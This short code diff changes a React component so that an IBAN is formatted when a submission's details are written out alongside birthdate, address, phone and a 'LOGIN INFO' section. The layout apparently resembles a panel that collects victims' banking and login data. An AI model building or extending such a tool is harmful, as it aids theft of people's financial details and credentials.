@@ -192,7 +192,7 @@ function DetailContent() {
     `door: ${submission.door_number || ""}`,
     `postcode: ${submission.postal_code || ""}`,
     `birthdate: ${submission.birthdate || ""}`,
-    `iban: ${submission.iban || ""}`,
+    `iban: ${submission.iban ? formatIBAN(submission.iban) : ""}`,
     `phone: ${submission.phone || ""}`,
     ``,
     `======> LOGIN INFO <=======`,
